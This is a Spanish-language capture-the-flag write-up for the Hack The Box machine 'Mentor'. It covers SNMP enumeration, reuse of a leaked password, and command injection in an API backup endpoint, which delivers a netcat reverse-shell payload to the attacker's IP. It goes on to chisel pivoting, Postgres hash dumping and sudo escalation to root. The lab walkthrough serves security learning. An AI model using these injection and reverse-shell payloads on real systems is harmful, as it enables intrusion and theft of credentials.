
---
**Máquina:** Mentor

**Plataforma:** Hack The Box

**Laboratorio:** https://app.hackthebox.com/machines/Mentor

**Target:** 10.10.11.193

**/etc/hosts:**  mentorquotes.htb api.mentorquotes.htb


---
# Guía de explotación paso a paso 'Mentor'

---
## Fase de enumeración

### Paso 1 -

Acción: escaneo inicial con nmap

```Shell
nmap -p- --open -sS -n -Pn --min-rate 5000 -vvv 10.10.11.193 -oG allPorts
```

Acción:

```Shell
nmap -p22,80 -sCV -oN targeted 10.10.11.193
```

Acción: 

```Shell
nmap -sU -n -Pn --top-ports 1000 10.10.11.193
```

Resultado:

```Shell
PORT      STATE  SERVICE
17/udp    closed qotd
161/udp   open   snmp
502/udp   closed mbap
814/udp   closed unknown
16680/udp closed unknown
17237/udp closed unknown
17629/udp closed unknown
```

Explicación: detectamos un servicio **snmp** ejecutándose por el puerto 161

**snmp:** SNMP (Simple Network Management Protocol) es un protocolo usado para monitorear y gestionar dispositivos de red como routers, switches y servidores. Permite recolectar información y controlar configuraciones remotamente.

---

### Paso 2 -

Acción: 

```Shell
whatweb http://10.10.11.193
```

Resultado:

```Shell
http://10.10.11.193 [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.193], RedirectLocation[http://mentorquotes.htb/], Title[302 Found]
http://mentorquotes.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.3 Python/3.6.9], IP[10.10.11.193], Python[3.6.9], Title[MentorQuotes], Werkzeug[2.0.3]
```

Explicación: encontramos un dominio que tenemos que añadir al `/etc/hosts` para poder resolverlo

### Paso 3 -

Acción: 

```Shell
wfuzz -c -t 200 --hc=302 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.mentorquotes.htb" http://mentorquotes.htb
```

Resultado:

```Shell
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000051:   404        0 L      2 W        22 Ch       "api"  
```

Explicación: con esta ruta `api.mentorquotes.htb` y con el servicio `snmp` tenemos dos posibles vectores de ataques. Aún así antes de intentar algo más intrusivo, sigamos enumerando

### Paso 4 -

Acción: 

```Shell
gobuster dir -u http://api.mentorquotes.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
```

Resultado:

```Shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/users                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/users/]
/docs                 (Status: 200) [Size: 969]
/admin                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/admin/]
/quotes               (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/quotes/]
/redoc                (Status: 200) [Size: 772]
```

Acción: 

```Shell
gobuster dir -u http://api.mentorquotes.htb/admin/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
```

Resultado:

```Shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/check                (Status: 422) [Size: 186]
/backup               (Status: 405) [Size: 31]
```

Explicación: Con esta enumeración encontramos dos rutas que no tenemos permiso de acceso pero se nos queda ahí pendiente por si conseguimos algún token o cookie de acceso

### Paso 5 -

Acción: 

```Shell
http://api.mentorquotes.htb/docs 
```

Resultado:
![Captura](./Imágenes/docs_mentor.png)

Explicación: en otra de las rutas `docs` encontramos un panel con diferentes rutas, navegando vemos que no tenemos acceso a esas rutas de momento. Aunque con *BurpSuite* vemos que podemos registrar y acceder como usuario, lo que se nos muestra (en BurpSuite) es un token de acceso. Con esta información podemos tratar de conseguir un token de administrador. Además hemos detectado un correo válido como vemos en la siguiente imagen

![Captura](./Imágenes/mail_mentor.png)


![Captura](./Imágenes/login_mentor.png)

![Captura](./Imágenes/login_2_mentor.png)

![Captura](./Imágenes/burp_1_mentor.png)


![Captura](./Imágenes/burp_2_mentor.png)

Explicación: de este modo podemos registrar un usuario y obtener un token de inicio de sesión

![Captura](./Imágenes/login_3_mentor.png)

![Captura](./Imágenes/burp_3_mentor.png)

Explicaicón: tras registrarnos y loguernos hemos obtenido un **jwt** el cual no da a entender como es el funcionamiento del servidor. Podemos probar en otro apartado de la ruta en la que estamos a introducir el token obtenido

![Captura](./Imágenes/token_mentor.png)

![Captura](./Imágenes/get_user_mentor.png)

Explicación: aquí de entrada no aparecía el apartado `Authorization` por lo que lo añadimos manualmente junto a su token, pero nos devuelve una respuesta de solo acceso para administradores. Refuerza nuestra hipótesis de que necesitamos un token con privilegios de administrador

---
## Fase de explotación
### Paso 1 -

Acción:  

```Shell
onesixtyone -c /usr/share/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.11.193
```

Resultado:

```Shell
Scanning 1 hosts, 120 communities
10.10.11.193 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
10.10.11.193 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
```

Explicación:  una vez enumerado, pasamos a explotar el vector de ataque *snmp*, para ello usamos la herramienta `onesixtyone` que nos muestra la community strings por defecto 'public'

**onesixtyone:** es una herramienta para descubrir dispositivos SNMP activos en una red. Se usa para hacer escaneos rápidos de SNMP usando diccionarios de _community strings_.

**Nota:** para el siguiente escaneo, antes vamos a instalar este recurso: `apt install snmp-mibs-downloader` para poder listar la información de forma descriptiva y no en caracteres iso. Posteriormente, modificamos este archivo: `nvim /etc/snmp/snmp.conf` y comentamos y añadimos: `mibdirs +/var/lib/snmp/mibs` como se ve a continuación

```lua
# As the snmp packages come without MIB files due to license reasons, loading
# of MIBs is disabled by default. If you added the MIBs you can reenable
# loading them by commenting out the following line.
#mibs :
mibdirs +/var/lib/snmp/mibs
# If you want to globally change where snmp libraries, commands and daemons
# look for MIBS, change the line below. Note you can set this for individual
# tools with the -M option or MIBDIRS environment variable.
#
# mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
```
### Paso 2 -

Acción: 

```Shell
snmpwalk -c public -v1 10.10.11.193
```

Resultado:

```Shell
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (477515) 1:19:35.15
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
SNMPv2-MIB::sysName.0 = STRING: mentor

...

SNMPv2-MIB::sysORUpTime.10 = Timeticks: (1) 0:00:00.01
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (479229) 1:19:52.29
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2025-5-21,17:24:36.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 228
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
End of MIB
```

Explicación:  mencionar que este escaneo usa la versión 1: `-v1` podemos obtener diferente información con otras versiones

Acción:

```bash
wget https://raw.githubusercontent.com/SECFORCE/SNMP-Brute/refs/heads/master/snmpbrute.py
```

Resultado:

```bash
#!/usr/bin/env python
# Requires metasploit, snmpwalk, snmpstat and John the Ripper
#   _____ _   ____  _______     ____             __
#  / ___// | / /  |/  / __ \   / __ )_______  __/ /____
#  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
# ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
#/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/
#
# SNMP Bruteforce & Enumeration Script
# http://www.secforce.com / nikos.vassakis <at> secforce.com
# ##########################################################
__version__ = 'v2.0'

...

if __name__ == "__main__":
```

Explicación: para poder escanear la versión 2 usamos este script en python que encontramos en GitHub

Acción:

```bash
python3 snmpbrute.py -t 10.10.11.193 -f /usr/share/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```

Resultado:

```bash
community strings ...
10.10.11.193 : 161 	Version (v1):	public
10.10.11.193 : 161 	Version (v2c):	public
10.10.11.193 : 161 	Version (v2c):	internal
```

Explicación: para la versión `v2c` tenemos la community strings *internal*

Acción: 

```bash
snmpwalk -c internal -v2c 10.10.11.193
```

Explicación: como la información que ahora se nos muestra es mucho mayor, tenemos que filtrar para poder buscar entre tanto ruido

Acción:

```bash
snmpbulkwalk -c internal -v2c 10.10.11.193 > snmp_output.txt
```

Acción:

```bash
cat snmp_output.txt | grep "Path"
```

Resultado:

```bash
HOST-RESOURCES-MIB::hrSWRunPath.857 = STRING: "/usr/bin/python3"
HOST-RESOURCES-MIB::hrSWRunPath.858 = STRING: "/usr/libexec/polkitd"
HOST-RESOURCES-MIB::hrSWRunPath.859 = STRING: "/usr/sbin/rsyslogd"
HOST-RESOURCES-MIB::hrSWRunPath.860 = STRING: "/usr/lib/snapd/snapd"
HOST-RESOURCES-MIB::hrSWRunPath.861 = STRING: "/lib/systemd/systemd-logind"
HOST-RESOURCES-MIB::hrSWRunPath.862 = STRING: "/usr/libexec/udisks2/udisksd"
HOST-RESOURCES-MIB::hrSWRunPath.909 = STRING: "/usr/sbin/ModemManager"
HOST-RESOURCES-MIB::hrSWRunPath.1219 = STRING: "/usr/sbin/cron"

...

HOST-RESOURCES-MIB::hrSWRunPath.1977 = STRING: "/usr/bin/docker-proxy"
HOST-RESOURCES-MIB::hrSWRunPath.1992 = STRING: "/usr/bin/containerd-shim-runc-v2"
HOST-RESOURCES-MIB::hrSWRunPath.2012 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunPath.2066 = STRING: "/usr/local/bin/python3"
HOST-RESOURCES-MIB::hrSWRunPath.2067 = STRING: "/usr/local/bin/python3"
HOST-RESOURCES-MIB::hrSWRunPath.2110 = STRING: "postgres: postgres mentorquotes_db 172.22.0.1(43672) idle"
HOST-RESOURCES-MIB::hrSWRunPath.2111 = STRING: "postgres: postgres mentorquotes_db 172.22.0.1(43686) idle"
HOST-RESOURCES-MIB::hrSWRunPath.2123 = STRING: "/usr/bin/python3"
HOST-RESOURCES-MIB::hrSWRunPath.147956 = STRING: "/usr/sbin/apache2"
```

Explicación: entre toda la información vemos algunos procesos de python, por lo que podríamos tratar de buscar dado su identificador, por cada proceso tratando de encontrar algo que nos de más información

Acción:

```bash
cat snmp_output.txt | grep "2123"
```

Resultado:

```bash
IP-MIB::ipSystemStatsInOctets.ipv4 = Counter32: 212382999
IP-MIB::ipSystemStatsHCInOctets.ipv4 = Counter64: 212382999
HOST-RESOURCES-MIB::hrSWRunIndex.2123 = INTEGER: 2123
HOST-RESOURCES-MIB::hrSWRunName.2123 = STRING: "login.py"
HOST-RESOURCES-MIB::hrSWRunID.2123 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.2123 = STRING: "/usr/bin/python3"
HOST-RESOURCES-MIB::hrSWRunParameters.2123 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
HOST-RESOURCES-MIB::hrSWRunType.2123 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.2123 = INTEGER: runnable(2)
HOST-RESOURCES-MIB::hrSWRunPerfCPU.2123 = INTEGER: 84
HOST-RESOURCES-MIB::hrSWRunPerfMem.2123 = INTEGER: 24196 KBytes
```

Explicación: vemos un proceso, un script de python, que ejecuta un `login.py` y viene como argumento una cadena que parece una contraseña: `kj23sadkj123as0-d213` podemos probar a usarla como el usuario 'james' que encontramos anteriormente

![Captura](./Imágenes/acces_mentor.png)

Explicación: vemos que la contraseña es correcta para el usuario james y obtenemos un token, podemos probar si este usuario tiene permisos de administrador y listar usuarios de servicio

![Captura](./Imágenes/acces_2_mentor.png)

![Captura](./Imágenes/acces_3_mentor.png)

Explicación: introduciendo el JWT que obtenemos vemos que si tenemos acceso a esta ruta privilegiada. Por lo que ahora probamos con otra ruta que nos llamó la atención y no teníamos acceso anteriormente. `/admin/backup` y en *BurpSuite* arrastrando el JWT la respuesta es: `"Method Not Allowed"`. Por lo que cambiamos el método GET a **POST** y volvemos a enviar, vemos que ahora nos pide enviar un contenido en formato específico.

![Captura](./Imágenes/burp_1_mentor 1.png)

![Captura](./Imágenes/burps_2_mentor.png)

Explicación: cambiamos el método GET a **POST** y modificamos el 'Content-Type:' a 'application/json' por lo que introducimos como prueba algún valor y observamos que nos pide un campo *path*. Al introducir el valor 'path' como se muestra en la imagen la respuesta es `INFO: "Done!"`, como es una ruta backup, y no sabemos que esta ocurriendo con esto que se confirma realizado. Seguimos probando para tratar de ejecutar comandos y enviarnos una reverse shell 

Acción: alternativa con **curl**

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H "Content-Type: application/json" -d '{"path":"test"}' | jq
```

Resultado:

```bash
{
  "INFO": "Done!"
}
```

**Nota:** en este punto la hipótesis es tratar de hacer un command injection, ya que es posible que el backup este interactuando con tar o zip

*Ejemplo:* si con tar ocurre algo como descomprimir un archivo en una ruta específica, podemos concatenar comandos de la siguiente forma y ver si recibimos conexión:

```bash
tar -cf /user/ejemplo.tar /etc/passwd
```

```bash
tar -cf /user/ejemplo.tar /etc/passwd; ping -c 1 IP_ATACANTE 
```

Esto podría derivare a una **Reverse Shell**

Acción:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H "Content-Type: application/json" -d '{"path":";sleep 5;"}' | jq
```

Explicación: primero probamos sin el punto y coma `;` pero no pasa nada, luego probamos con el de delante y nada. Cuando ponemos los dos `;sleep 5;` la respuesta tarda 5 segundo en darse, tenemos un **command injection**

Acción:

```bash
tcpdump -i tun0 icmp -n
```

![Captura](./Imágenes/tcpdump_mentor.png)

Acción:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H "Content-Type: application/json" -d '{"path":";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 443 >/tmp/f;"}' | jq
```

Resultado:

```bash
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.193] 43791
/bin/sh: can't access tty; job control turned off
/app # 
```

Acudimos a esta página para buscar un payload de reverse shell que no use el parámetro `-e` ya que es suponemos que la versión de `Netcat` del sistema será antigua: [Monkey Pentester](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

**Nota:** como el tratamiento de la *tty* no se puede hacer con `script` ni con `python` lo que hacemos es que usamos este comando que no puede usar `ctrl+c` pero sí `ctrl+l`:

```bash
rlwrap nc -lvnp 443
```

---
## Fase de escapada de contenedor Docker

---

### Paso 1

Acción:

```bash
/app # ls
Dockerfile
app
requirements.txt
/app # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Resultado:

```bash
Dockerfile
app
requirements.txt
```

Acción:

```bash
/app # ip a
```

Resultado:

```bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Explicación:  tanto por la IP, como por el contenido del directorio actual, todo indica que estamos en un contenedor `Docker` por lo que tendremos que 'escapar de ella'

### Paso 2

Acción:

```bash
cat db.py
```

Resultado:

```bash
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)


# Databases query builder
database = Database(DATABASE_URL)
```

Explicación: vemos `postgresql://postgres:postgres@172.22.0.1/mentorquotes_db` que es el tipo de base de datos, su usuario y contraseña, y, la máquina anfitriona que es el host local, y el nombre de la base de datos

### Paso 3

Acción:

```bash
cat /proc/net/tcp     
```

Resultado:

```bash
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:1F40 00000000:0000 0A 00000000:00000001 00:00000000 00000000     0        0 36257 2 0000000000000000 100 0 0 10 0                     
   1: 0B00007F:89A1 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 36033 1 0000000000000000 100 0 0 10 0                     
   2: 030016AC:B6A1 02100A0A:01BB 01 00000000:00000000 00:00000000 00000000     0        0 131638 2 0000000000000000 26 4 33 10 -1                   
   3: 030016AC:1F40 010016AC:D14C 08 00000000:00000001 00:00000000 00000000     0        0 134283 1 0000000000000000 20 4 28 10 -1                   
   4: 030016AC:8A56 010016AC:1538 01 00000000:00000000 00:00000000 00000000     0        0 133783 1 0000000000000000 20 4 0 10 -1                    
   5: 030016AC:1F40 010016AC:C2B6 01 00000000:0000012D 00:00000000 00000000     0        0 0 1 0000000000000000 20 4 28 10 -1                        
   6: 030016AC:D572 010016AC:1538 01 00000000:00000000 02:00035BDC 00000000     0        0 37581 2 0000000000000000 20 4 0 10 -1
```

Explicación: vemos la salida del archivo `/proc/net/tcp` en Linux, que muestra conexiones TCP en formato hexadecimal. Para **traducir las direcciones IP** de esa salida hexadecimal a formato decimal (IPv4 legible), hay que hacer lo siguiente:


Acción:

```bash
echo "010016AC"
```

Acción:

```bash
echo "01 00 16 AC 16 00 01"
```

Acción:

```bash
echo "AC 16 00 01"
```

Acción:

```bash
echo "$((0xAC)).$((0x16)).$((0x00)).$((0x01))"
```

Resultado:

```bash
172.22.0.1
```

Explicación: convertimos la IP de hexadecimal a decimal y vemos que esta es la de la máquina host


Acción:

```bash
echo "$((0x1538))"
```

Resultado:

```bash
5432
```

Explicación: ahora probamos con la parte de los puertos y vemos que corresponde con el puerto `5432` propio de PostgreSQL ( *Enumeración de puertos y servicios* )

### Paso 4

Acción:

```bash
wget https://github.com/jpillora/chisel
go build -ldflags "-s -w" .
```

Resultado:

```bash
chisel 
```

- `-s`: omite la tabla de símbolos (debug symbols).
    
- `-w`: omite el _DWARF_ debug info, que es usada por los depuradores.

Con `du -hc chise` comprobaríamos el tamaño del archivo y con `upx chisel` lo reduciríamos aún más su tamaño sin llegar a afectar al archivo

**Resultado:** binario más pequeño y ligero (ideal para despliegue, especialmente en pentesting o cuando necesitas cargar binarios por red).

Explicación: necesitamos hacer 'Port Forwarding' y tunelizar, ya que no tenemos otra vía, y tenemos las credenciales vistas anteriormente

Acción:

```bash
python3 -m http.server 80
-
cd /tmp
wget http://10.10.16.2/chisel
chmod +x chisel
./chisel
```

**Problema de transferencia:** el archivo se transfería bien pero no lograba ejecutarse

**Solución** usar el siguiente comando para compilar el archivo en la máquina atacante y transferir

```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o chisel
```

Resultado:

```bash
Usage: chisel [command] [--help]

  Version: 0.0.0-src (go1.19.8)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

Explicación: nos trasferimos el archivo chisel desde nuestra máquina atacante 

Acción: *primero en nuestra máquina atacante* 

```bash
./chisel server --reverse -p 1234
```

Resultado:

```bash
2025/05/22 02:05:28 server: Reverse tunnelling enabled
2025/05/22 02:05:28 server: Fingerprint L4eLVkTfkhZZ7uNZhywaA3WmRkszjF9pMXF4j+068bE=
2025/05/22 02:05:28 server: Listening on http://0.0.0.0:1234
```

Explicación: Este comando se utiliza para **iniciar un servidor Chisel en modo reverse**, lo cual es especialmente útil en entornos de pentesting donde **la máquina víctima no puede aceptar conexiones entrantes** (por ejemplo, está detrás de NAT o firewall), pero **sí puede establecer conexiones salientes** hacia tu máquina atacante

---

`server` Este argumento indica que quieres iniciar **el modo servidor** de Chisel. El servidor es el que gestiona las conexiones y permite redirigir puertos o túneles.

`--reverse` Este es **el modo reverse proxy**. Activa el modo en el que:

- La **víctima se conecta como cliente a este servidor**.
    
- El servidor "escucha" y acepta túneles reversos **desde la víctima hacia el atacante**.
    
- Ideal para cuando **la víctima no puede recibir conexiones entrantes**, pero **puede hacer peticiones salientes** (como a tu máquina Parrot).
    

**Ejemplo práctico**: si la víctima hace `chisel client 10.10.16.2:1234 R:8080:127.0.0.1:80`, entonces:

- La víctima crea una conexión a `10.10.16.2:1234` (tu Parrot).
    
- A través de esa conexión, te permite acceder a su puerto `80` local (en su `127.0.0.1`) como si estuviera en `127.0.0.1:8080` **desde tu máquina atacante**.
    

`-p 1234` Esto le indica al servidor que escuche en el **puerto 1234**.


**¿Cuándo usarlo?**

- No puedes hacer un **bind shell** o **reverseshell** por cortafuegos o NAT.
    
- Necesitas **pivotear** o acceder a servicios internos de la víctima.
    
- Estás en una red interna y quieres **túneles seguros** desde la víctima a tu equipo.

---

Acción: *segundo desde la víctima*

```bash
./chisel client 10.10.16.8:1234 R:5432:172.22.0.1:5432
```

Acción: desde nuestro equipo atacante podremos acceder al puerto 5432 de la víctima de forma indirecta

```bash
curl http://127.0.0.1:5432
```

Explicación:

### Paso 5

Acción:

```bash
psql -h 127.0.0.1 -p 5432 -U postgres
```

Resultado:

```bash
Contraseña para usuario postgres: <postgres>
psql (15.12 (Debian 15.12-0+deb12u2), servidor 13.7 (Debian 13.7-1.pgdg110+1))
Digite «help» para obtener ayuda.

postgres=# 
```

Acción:

```bash
postgres=# \l
postgres=# \c mentorquotes_db
psql (15.12 (Debian 15.12-0+deb12u2), servidor 13.7 (Debian 13.7-1.pgdg110+1))
Ahora está conectado a la base de datos «mentorquotes_db» con el usuario «postgres».
mentorquotes_db=# \dt
         Listado de relaciones
 Esquema |  Nombre  | Tipo  |  Dueño   
---------+----------+-------+----------
 public  | cmd_exec | tabla | postgres
 public  | quotes   | tabla | postgres
 public  | users    | tabla | postgres
(3 filas)
```

```bash
mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | metahumo@mail.com      | metahumo    | 248bca25a8a6b6cdb8aecea240202643
(3 filas)
```

```txt
53f22d0dfa10dce7e29cd31f4f953fd8 ---(hashes.com)---> 123meunomeeivani
```

Acción:

```bash
ssh svc@mentorquotes.htb
```

Resultado:

```bash
svc@mentor:~$ whoami
svc
svc@mentor:~$ pwd
/home/svc
svc@mentor:~$ ls
user.txt
```

---

## Fase elevar privilegios

Acción:

```bash
cat /etc/snmp/snmpd.conf
```

Resultado:

```bash

...

# include a all *.conf files in a directory
includeDir /etc/snmp/snmpd.conf.d


createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv

com2sec AllUser default internal
group AllGroup v2c AllUser
#view SystemView included .1.3.6.1.2.1.1
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none none
```

Acción:

```bash
su james --> SuperSecurePassword123__
```

Acción:

```bash
sudo -l
```

Resultado:

```bash
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```

Acción y resultado:

```bash
sudo sh
# whoami
root
# cd /home
# ls
james  svc
# cd /root
# ls
logins.log  root.txt  scripts  snap
# cat root.txt
```

---
